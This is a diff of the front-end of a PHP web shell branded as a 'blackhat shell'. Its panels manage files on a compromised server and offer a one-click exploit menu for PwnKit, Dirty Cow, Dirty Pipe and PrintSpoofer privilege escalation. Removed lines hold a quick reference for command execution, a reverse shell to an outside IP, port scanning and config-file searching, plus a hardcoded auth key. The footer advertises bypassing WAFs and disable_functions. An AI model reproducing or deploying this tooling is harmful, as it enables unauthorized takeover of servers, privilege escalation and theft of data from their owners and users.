+            <input type="file" name="file" style="background:#1a1a1a;border:1px solid #00ff00;color:#00ff00;padding:4px;max-width:180px;">
+            <button type="submit" class="btn-upload">⬆ UPLOAD</button>
+        </form>
+        <a href="?dir=<?= urlencode(dirname($cwd)) ?>" style="color:#00aaff;text-decoration:none;padding:5px 10px;border:1px solid #00aaff;border-radius:3px;">⬅ UP</a>
+        <span style="color:#444;">|</span>
+        <form method="GET" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
+            <input type="hidden" name="action" value="zip">
+            <input type="text" name="folder" placeholder="📁 Folder" style="min-width:80px;">
+            <input type="text" name="zipname" placeholder="📦 Zip Name" style="min-width:80px;">
+            <button type="submit">📦 ZIP</button>
+        </form>
+        <form method="GET" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
+            <input type="hidden" name="action" value="unzip">
+            <input type="text" name="file" placeholder="📦 File.zip" style="min-width:80px;">
+            <input type="text" name="dest" placeholder="📁 Dest" style="min-width:80px;">
+            <button type="submit">📂 UNZIP</button>
+        </form>
+        <!-- EXPLOIT BUTTONS -->
+        <form method="GET" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
+            <input type="hidden" name="action" value="exploit_check">
+            <button type="submit" class="btn-exploit">🔍 CHECK VULN</button>
+        </form>
+        <form method="GET" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
+            <input type="hidden" name="action" value="exploit_run">
+            <select name="type" style="background:#1a1a1a;border:1px solid #00ff00;color:#00ff00;padding:5px 10px;border-radius:3px;">
+                <option value="auto">⚡ AUTO</option>
+                <option value="pwnkit">PwnKit (CVE-2021-4034)</option>
+                <option value="dirtycow">Dirty Cow (CVE-2016-5195)</option>
+                <option value="dirtypipe">Dirty Pipe (CVE-2022-0847)</option>
+                <option value="printspoofer">PrintSpoofer (Windows)</option>
+            </select>
+            <button type="submit" class="btn-exploit">🔥 RUN</button>
         </form>
     </div>
 
-    <div class="panel" style="border-color:#0066ff;">
-        <h3>🗄️ DATABASE CLIENT</h3>
-        <form method="GET">
-            <input type="hidden" name="action" value="db">
-            <div class="grid-3">
-                <select name="params[type]" style="width:100%; padding:12px; background:#1a1a1a; border:1px solid #00ff00; color:#00ff00; border-radius:5px; margin-bottom:10px;">
-                    <option value="mysql">MySQL</option>
-                    <option value="pgsql">PostgreSQL</option>
-                    <option value="sqlite">SQLite</option>
-                </select>
-                <input type="text" name="params[host]" placeholder="🖥️ Host..." value="localhost">
-                <input type="text" name="params[dbname]" placeholder="🗄️ Database..." value="test">
+    <!-- MASS ACTION FORM -->
+    <form method="POST" id="massActionForm">
+        <input type="hidden" name="action" value="mass_delete" id="massAction">
+        <input type="hidden" name="dest_dir" id="massDestDir">
+        <div class="grid">
+            <!-- LEFT: FILE LIST -->
+            <div class="panel">
+                <h3>📁 FILE MANAGER 
+                    <span style="font-size:11px;color:#666;">
+                        <button type="button" onclick="selectAll()" style="background:#222;color:#00ff00;border:1px solid #00ff00;padding:0 8px;font-size:10px;border-radius:3px;cursor:pointer;">Select All</button>
+                        <button type="button" onclick="deselectAll()" style="background:#222;color:#00ff00;border:1px solid #00ff00;padding:0 8px;font-size:10px;border-radius:3px;cursor:pointer;">Deselect</button>
+                    </span>
+                </h3>
+                <div class="file-list">
+                    <?php if (isset($file_list['error'])): ?>
+                        <p style="color:#ff4444;"><?= $file_list['error'] ?></p>
+                    <?php else: ?>
+                        <?php foreach ($file_list as $file): ?>
+                        <div class="file-item">
+                            <input type="checkbox" name="files[]" value="<?= htmlspecialchars($file['name']) ?>" style="margin-right:8px;accent-color:#00ff00;">
+                            <span class="name <?= $file['is_dir'] ? 'dir' : '' ?>">
+                                <?= $file['is_dir'] ? '📁' : '📄' ?>
+                                <?php if ($file['is_dir']): ?>
+                                    <a href="?dir=<?= urlencode($file['path']) ?>" style="color:#00aaff;text-decoration:none;"><?= htmlspecialchars($file['name']) ?></a>
+                                <?php else: ?>
+                                    <a href="?edit=<?= urlencode($file['path']) ?>&dir=<?= urlencode($cwd) ?>" style="color:#00ff00;text-decoration:none;"><?= htmlspecialchars($file['name']) ?></a>
+                                <?php endif; ?>
+                            </span>
+                            <span class="info"><?= $file['size'] ?> | <?= $file['perms'] ?></span>
+                            <span class="actions">
+                                <?php if (!$file['is_dir']): ?>
+                                <a href="?edit=<?= urlencode($file['path']) ?>&dir=<?= urlencode($cwd) ?>" title="Edit">✏️</a>
+                                <a href="?view=<?= urlencode($file['path']) ?>&dir=<?= urlencode($cwd) ?>" title="View">👁️</a>
+                                <a href="#" onclick="singleDelete('<?= urlencode($file['path']) ?>')" class="del" title="Delete">🗑️</a>
+                                <a href="#" onclick="singleRename('<?= urlencode($file['path']) ?>')" class="del" title="Rename">📝</a>
+                                <?php else: ?>
+                                <a href="#" onclick="singleDelete('<?= urlencode($file['path']) ?>')" class="del" title="Delete Folder">🗑️</a>
+                                <?php endif; ?>
+                            </span>
+                        </div>
+                        <?php endforeach; ?>
+                    <?php endif; ?>
+                </div>
+                <div style="margin-top:10px;display:flex;gap:8px;flex-wrap:wrap;">
+                    <button type="submit" onclick="setMassAction('mass_delete');return confirm('Delete all selected?')" class="btn-danger">🗑️ DELETE</button>
+                    <button type="button" onclick="massRename()" style="background:#ff8800;color:#000;border:none;padding:5px 15px;border-radius:3px;cursor:pointer;">📝 RENAME</button>
+                    <button type="button" onclick="massCopy()" style="background:#0088ff;color:#fff;border:none;padding:5px 15px;border-radius:3px;cursor:pointer;">📋 COPY</button>
+                    <button type="button" onclick="massMove()" style="background:#aa44ff;color:#fff;border:none;padding:5px 15px;border-radius:3px;cursor:pointer;">📂 MOVE</button>
+                </div>
             </div>
-            <div class="grid-3">
-                <input type="text" name="params[user]" placeholder="👤 Username..." value="root">
-                <input type="text" name="params[pass]" placeholder="🔑 Password..." value="">
-                <button type="submit" style="background:#0066ff;">🔗 CONNECT</button>
+
+            <!-- RIGHT: EDITOR / OUTPUT / VIEW -->
+            <div class="panel editor">
+                <h3>📝 <?= $edit_file ? 'EDIT: ' . basename($edit_file) : ($view_file ? 'VIEW: ' . basename($view_file) : 'OUTPUT') ?></h3>
+                <?php if ($edit_file): ?>
+                <form method="POST" action="?edit=<?= urlencode($edit_file) ?>&dir=<?= urlencode($cwd) ?>" onsubmit="return confirm('Save changes?')">
+                    <input type="hidden" name="action" value="edit">
+                    <textarea name="content"><?= htmlspecialchars($edit_content) ?></textarea>
+                    <button type="submit">💾 SAVE</button>
+                    <a href="?dir=<?= urlencode($cwd) ?>" style="color:#00ff00;text-decoration:none;padding:5px 15px;border:1px solid #00ff00;border-radius:3px;">✕ CLOSE</a>
+                </form>
+                <?php elseif ($view_file): ?>
+                <div class="output-box" style="max-height:500px;"><?= htmlspecialchars($view_content) ?></div>
+                <a href="?dir=<?= urlencode($cwd) ?>" style="color:#00ff00;text-decoration:none;padding:5px 15px;border:1px solid #00ff00;border-radius:3px;">✕ CLOSE</a>
+                <?php elseif (isset($output)): ?>
+                <div class="output-box"><?= htmlspecialchars($output) ?></div>
+                <?php elseif (isset($results) && !empty($results)): ?>
+                <div class="output-box">
+                    <?php foreach ($results as $r): ?>
+                    📄 <?= htmlspecialchars($r) ?><br>
+                    <?php endforeach; ?>
+                </div>
+                <?php else: ?>
+                <div style="color:#666;padding:20px;text-align:center;">
+                    Klik file untuk edit / view<br>atau jalankan command di atas
+                </div>
+                <?php endif; ?>
             </div>
-        </form>
-    </div>
-
-    <div class="panel">
-        <h3>📋 OUTPUT <?php if (isset($exec_method) && $exec_method !== 'NONE'): ?><span class="method-tag method-<?= strtolower($exec_method) ?>"><?= strtoupper($exec_method) ?></span><?php endif; ?></h3>
-        <div class="output"><?= htmlspecialchars($output) ?></div>
-    </div>
-
-    <div class="panel">
-        <h3>📚 QUICK REFERENCE</h3>
-        <div style="font-size:12px; color:#aaa; display:grid; grid-template-columns:1fr 1fr 1fr; gap:8px;">
-            <div><span class="badge">EXEC</span> ?action=exec&cmd=whoami</div>
-            <div><span class="badge">FILE</span> ?action=file&cmd=list&target=/tmp</div>
-            <div><span class="badge">REVERSE</span> ?action=reverse&ip=1.2.3.4&port=4444</div>
-            <div><span class="badge">SCAN</span> ?action=portscan&target=127.0.0.1&params[ports]=1-100</div>
-            <div><span class="badge">SEARCH</span> ?action=file&cmd=search&target=/var&params[pattern]=config</div>
-            <div><span class="badge">ARCHIVE</span> ?action=file&cmd=archive&target=/var/www&params[type]=zip</div>
-            <div><span class="badge">UPLOAD</span> Form di atas (POST)</div>
-            <div><span class="badge">DB</span> ?action=db&params[type]=mysql&params[host]=localhost&params[user]=root&params[pass]=&params[dbname]=test</div>
-            <div><span class="badge">AUTH</span> ?auth=SERPENTECHUNTER666</div>
         </div>
-    </div>
+    </form>
 
     <div class="footer">
-        <p>🐍 SERPENTECHUNTER v2.0 – ULTIMATE BLACKHAT SHELL</p>
-        <p>👑 DEVELOPER: SerpentSecHunter | 📅 RILIS: 02-07-2026</p>
-        <p>💀 "TIDAK ADA YANG GAK BISA!" – ZAMZZZ 😈</p>
-        <p>🔥 BYPASS: 403/404 (9 teknik) | disable_functions (12 strategi) | WAF (6 teknik)</p>
-        <p style="color:#444;">© 2026 SerpentSecHunter – ALL RIGHTS RESERVED</p>
+        🐍 SERPENTECHUNTER v2.1 &nbsp;|&nbsp; © 2026 SerpentSecHunter<br>
+        <span style="font-size:10px;color:#444;">🔥 BYPASS: Path Traversal | Double Encoding | Null Byte | Header Injection | Method Tampering | User-Agent Spoofing | EXPLOIT ENGINE</span>
     </div>
 </div>
+
+<script>
+// === TOAST NOTIFICATION ===
+function showToast(msg, isError = false) {
+    let toast = document.getElementById('toast');
+    toast.textContent = msg;
+    toast.className = 'toast show' + (isError ? ' error' : '');
+    setTimeout(() => { toast.className = 'toast'; }, 3000);
+}
+
+// === SHOW MESSAGE FROM PHP ===
+<?php if ($message): ?>
+showToast('<?= addslashes($message) ?>');
+<?php endif; ?>
+
+// === SELECT / DESELECT ALL ===
+function selectAll() {
+    document.querySelectorAll('input[name="files[]"]').forEach(cb => cb.checked = true);
+}
+function deselectAll() {
+    document.querySelectorAll('input[name="files[]"]').forEach(cb => cb.checked = false);
+}
+
+// === SET MASS ACTION ===
+function setMassAction(action) {
+    document.getElementById('massAction').value = action;
+}
+
+// === SINGLE DELETE ===
+function singleDelete(path) {
+    if(confirm('Delete this item?')) {
+        window.location.href = '?action=delete&file=' + path + '&dir=<?= urlencode($cwd) ?>';
+    }
+}
+
+// === SINGLE RENAME ===
+function singleRename(path) {
+    let newName = prompt('Enter new name:');
+    if(newName) {
+        window.location.href = '?action=rename&old=' + path + '&new=' + encodeURIComponent(newName) + '&dir=<?= urlencode($cwd) ?>';
+    }
+}
+
+// === MASS RENAME ===
+function massRename() {
+    let files = document.querySelectorAll('input[name="files[]"]:checked');
+    if(files.length === 0) { showToast('Select files first', true); return; }
+    let newNames = [];
+    let valid = true;
+    files.forEach(cb => {
+        let newName = prompt('New name for ' + cb.value, cb.value);
+        if(newName === null) { valid = false; return; }
+        newNames.push(newName);
+    });
+    if(!valid || newNames.length === 0) return;
+    let form = document.getElementById('massActionForm');
+    form.action = '?dir=<?= urlencode($cwd) ?>&action=mass_rename';
+    form.querySelectorAll('input[name="new_names[]"]').forEach(el => el.remove());
+    newNames.forEach(n => {
+        let inp = document.createElement('input');
+        inp.type = 'hidden';
+        inp.name = 'new_names[]';
+        inp.value = n;
+        form.appendChild(inp);
+    });
+    form.submit();
+}
+
+// === MASS COPY ===
+function massCopy() {
+    let files = document.querySelectorAll('input[name="files[]"]:checked');
+    if(files.length === 0) { showToast('Select files first', true); return; }
+    let dest = prompt('Destination directory (relative):');
+    if(!dest) return;
+    let form = document.getElementById('massActionForm');
+    form.action = '?dir=<?= urlencode($cwd) ?>&action=mass_copy';
+    document.getElementById('massDestDir').value = dest;
+    form.submit();
+}
+
+// === MASS MOVE ===
+function massMove() {
+    let files = document.querySelectorAll('input[name="files[]"]:checked');
+    if(files.length === 0) { showToast('Select files first', true); return; }
+    let dest = prompt('Destination directory (relative):');
+    if(!dest) return;
+    let form = document.getElementById('massActionForm');
+    form.action = '?dir=<?= urlencode($cwd) ?>&action=mass_move';
+    document.getElementById('massDestDir').value = dest;
+    form.submit();
+}
+</script>
 </body>
 </html>
